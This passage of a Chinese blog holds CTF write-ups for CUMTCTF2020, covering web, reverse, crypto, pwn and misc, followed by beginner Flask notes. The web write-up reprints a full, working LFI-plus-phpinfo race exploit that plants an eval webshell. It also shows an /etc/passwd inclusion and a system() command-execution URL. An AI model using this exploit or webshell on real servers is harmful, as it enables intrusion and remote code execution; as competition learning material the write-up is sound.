r.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(res.content)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Wrong username'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            j += a</span><br><span class="line">            flag +=a</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>好像是在最后，多跑一会就出来了</p>
<h2 id="Try-GET-file"><a href="#Try-GET-file" class="headerlink" title="Try:GET_file"></a>Try:GET_file</h2><p>先扫目录发现有phpinfo.php</p>
<p>包含一下发现有文件包含漏洞</p>
<p>之后又包含敏感文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/25/CUMTCTF2020/image-20200925185651724.png" alt="image-20200925185651724"></p>
<p>这里有一个phpinfo上传文件再包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是&#x2F;tmp&#x2F;php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class="line"></span><br><span class="line">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class="line"></span><br><span class="line">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class="line"></span><br><span class="line">1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class="line"></span><br><span class="line">2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class="line"></span><br><span class="line">3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</span><br><span class="line"></span><br><span class="line">4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class="line"></span><br><span class="line">5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</span><br><span class="line"></span><br><span class="line">6）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>
<p>这里有现成的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /index.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);</span><br><span class="line">#CUMTCTF&#123;Orz_to_php1nf0&#125;</span><br></pre></td></tr></table></figure>
<p>最后直接命令执行，但好像找了好久才看见flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="连个签到的分都不给你"><a href="#连个签到的分都不给你" class="headerlink" title="连个签到的分都不给你"></a>连个签到的分都不给你</h2><p>直接010查看搜cumtctf可以看见flag</p>
<h2 id="python题禁止py"><a href="#python题禁止py" class="headerlink" title="python题禁止py"></a>python题禁止py</h2><p>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag = input()</span></span><br><span class="line">cipher = [<span class="number">80</span>,<span class="number">70</span>,<span class="number">94</span>,<span class="number">71</span>,<span class="number">80</span>,<span class="number">71</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">86</span>,<span class="number">39</span>,<span class="number">64</span>,<span class="number">106</span>,<span class="number">76</span>,<span class="number">67</span>,<span class="number">106</span>,<span class="number">71</span>,<span class="number">123</span>,<span class="number">92</span>,<span class="number">125</span>,<span class="number">76</span>,<span class="number">37</span>,<span class="number">106</span>,<span class="number">103</span>,<span class="number">118</span>,<span class="number">80</span>,<span class="number">35</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>]</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if(len(flag==29)):</span></span><br><span class="line"><span class="comment">#     for i,n in enumerate(flag):</span></span><br><span class="line"><span class="comment">#         if ord(n) ^ 19 != cipher[i]:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    a = i ^ <span class="number">19</span></span><br><span class="line">    print(chr(a),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2 id="兄弟们快来帮帮萄萄"><a href="#兄弟们快来帮帮萄萄" class="headerlink" title="兄弟们快来帮帮萄萄"></a>兄弟们快来帮帮萄萄</h2><p>脱壳拖入IDA可以看见flag</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc 监听领flag</p>
<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>脱入010并输入字符串看是直接可以bash</p>
<p>直接读取就可以拿flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h2><p>rsa，已知e n c 求m</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line"><span class="comment"># c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hint ： google RS</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line">p = <span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">q = <span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">n = <span class="number">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>可以看见flag</p>
<h2 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h2><p>这个很明显就可以看出规律就是一般都是以8开头</p>
<p>然后我有点懒（说实话是不太会写）就一个一个拼接出flag</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="真·签到题"><a href="#真·签到题" class="headerlink" title="真·签到题"></a>真·签到题</h2><p>zip伪加密然后base64解密拿flag</p>
<h2 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h2><p>mp3隐写</p>
<p>这个题可以  cumt是密码</p>
<p>然后是mose编码我真是一个一个拼的，应该拿python脚本写比较好，毕竟pytho学得不太好</p>
<p>应该是这个，拼错了好几回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125;</span><br></pre></td></tr></table></figure>
<h2 id="大鲨鱼之你可劲找"><a href="#大鲨鱼之你可劲找" class="headerlink" title="大鲨鱼之你可劲找"></a>大鲨鱼之你可劲找</h2><p>流量包分析，直接跟tcp流可以看见一个盲注的传输内容</p>
<p>是二分法</p>
<p>然后我就又又又自己拼写</p>
<p>拼错了好几回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>python开发</title>
    <url>/2020/08/13/python%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>顺便复习一下python，主要是掌握一下python的主流框架（Flask和Django ）</p>
<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="URL和视图"><a href="#URL和视图" class="headerlink" title="URL和视图"></a>URL和视图</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从flask这个框架中导入Flask这个类</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个Flask对象</span></span><br><span class="line"><span class="comment"># Flask()</span></span><br><span class="line"><span class="comment"># 需要传递一个参数__name__</span></span><br><span class="line"><span class="comment"># 1. 方便flask框架去寻找资源</span></span><br><span class="line"><span class="comment"># 2. 方便flask插件比如Flask-Sqlalchemy出现错误的时候，好去寻找问题所在的位置</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route是一个装饰器</span></span><br><span class="line"><span class="comment"># @开头，并且在函数的上面，说明是装饰器</span></span><br><span class="line"><span class="comment"># 这个装饰器的作用，是做一个url与视图函数的映射</span></span><br><span class="line"><span class="comment"># 127.0.0.1:5000/   -&gt;  去请求hello_world这个函数，然后将结果返回给浏览器</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'我是第一个flask程序'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果当前这个文件是作为入口程序运行，那么就执行app.run()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="comment"># app.run()</span></span><br><span class="line">        <span class="comment"># 启动一个应用服务器，来接受用户的请求</span></span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">        <span class="comment">#  listen()</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<h3 id="设置debug模式"><a href="#设置debug模式" class="headerlink" title="设置debug模式"></a><strong>设置debug模式</strong></h3><ol>
<li>在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式。</li>
<li>debug模式的两大功能：<ul>
<li>当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。</li>
<li>只要修改了项目中的<code>python</code>文件，程序会自动加载，不需要手动重新启动服务器。</li>
</ul>
</li>
</ol>
<h3 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a><strong>使用配置文件</strong></h3><ol>
<li>新建一个<code>config.py</code>文件</li>
<li>在主app文件中导入这个文件，并且配置到<code>app</code>中，示例代码如下： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import config</span><br><span class="line">app.config.from_object(config)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="URL传参到视图"><a href="#URL传参到视图" class="headerlink" title="URL传参到视图"></a><strong>URL传参到视图</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)</span><br><span class="line">def users(id):</span><br><span class="line">    return u&#39;您请求的参数是：&#123;&#125;&#39;.format(id)</span><br><span class="line">#参数需要放在两个尖括号中。</span><br><span class="line">#视图函数中需要放和url中的参数同名的参数。</span><br></pre></td></tr></table></figure>
<h3 id="反转URL"><a href="#反转URL" class="headerlink" title="反转URL"></a><strong>反转URL</strong></h3><ol>
<li>什么叫做反转URL：从视图函数到url的转换叫做反转url</li>
<li>反转url的用处：<ul>
<li>在页面重定向的时候，会使用url反转。</li>
<li>在模板中，也会使用url反转。</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask,url_for</span><br><span class="line">print url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure>
<p><strong>页面跳转和重定向</strong></p>
<p> 用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让重定向到登录页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">form flask <span class="keyword">import</span> redirect,url_for</span><br><span class="line">url = url_for(<span class="string">'users'</span>)  users是视图函数</span><br><span class="line">redirect(url)</span><br></pre></td></tr></table></figure>
<h2 id="jinja2模板"><a href="#jinja2模板" class="headerlink" title="jinja2模板"></a>jinja2模板</h2><h3 id="模板渲染和参数"><a href="#模板渲染和参数" class="headerlink" title="模板渲染和参数"></a>模板渲染和参数</h3><p>1.如何渲染模板：</p>
<ul>
<li>模板放在<code>templates</code>文件夹下</li>
<li>从<code>flask</code>中导入<code>render_template</code>函数。</li>
<li>在视图函数中，使用<code>render_template</code>函数，渲染模板。注意：只需要填写模板的名字，不需要填写<code>templates</code>这个文件夹的路径。</li>
</ul>
<p>2.模板传参：</p>
<ul>
<li>如果只有一个或者少量参数，直接在<code>render_template</code>函数中添加关键字参数就可以了。</li>
<li>如果有多个参数的时候，那么可以先把所有的参数放在<strong>字典</strong>中，然后在<code>render_template</code>中，<br><strong>使用两个星号，把字典转换成关键参数传递进去，这样的代码更方便管理和使用。</strong></li>
</ul>
<p>3.在模板中，如果要使用一个变量，语法是：<code></code></p>
<p>4.访问模型中的属性或者是字典，可以通过<code></code>的形式，或者是使用<code></code>.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">		<span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">        name = <span class="string">'pz1o'</span></span><br><span class="line">        age = <span class="number">18</span></span><br><span class="line">    p = Person()</span><br><span class="line">    <span class="comment">#login_url = url_for('users')</span></span><br><span class="line">    <span class="comment">#return redirect(login_url)</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">'nan'</span>,</span><br><span class="line">        <span class="string">'person'</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line">    </span><br><span class="line">&lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<h3 id="if和for"><a href="#if和for" class="headerlink" title="if和for"></a>if和for</h3><p><strong>if</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> xxx %&#125;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> user%&#125;</span><br><span class="line">        &lt;a href="#"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;注销&lt;/a&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">        &lt;a href="#"&gt;登录&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;注册&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,user=user)</span><br></pre></td></tr></table></figure>
<p><strong>for</strong></p>
<p>  字典的遍历，语法和<code>python</code>一样，可以使用<code>items()</code>、<code>keys()</code>、<code>values()</code>、<code>iteritems()</code>、<code>iterkeys()</code>、<code>itervalues()</code></p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> k,v <span class="keyword">in</span> user.items() %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; k &#125;&#125;：&#123;&#123; v &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>   列表的遍历：语法和<code>python</code>一样。</p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> website <span class="keyword">in</span> websites %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><img src="/2020/08/13/python%E5%BC%80%E5%8F%91/image-20200814161938542.png" alt="image-20200814161938542"></p>
<p>介绍和语法：</p>
<ul>
<li><p>介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来。作用的对象是变量。</p>
</li>
<li><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;avatar|default()&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>default过滤器：如果当前变量不存在，这时候可以指定默认值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改默认图片</span></span><br><span class="line">avatar = <span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,avatar=avatar)</span><br><span class="line">&lt;img src=<span class="string">'&#123;&#123;avatar|default('</span>...<span class="string">')&#125;&#125;'</span>&gt;</span><br></pre></td></tr></table></figure>
<p>length过滤器：求列表或者字符串或者字典或者元组的长度。</p>
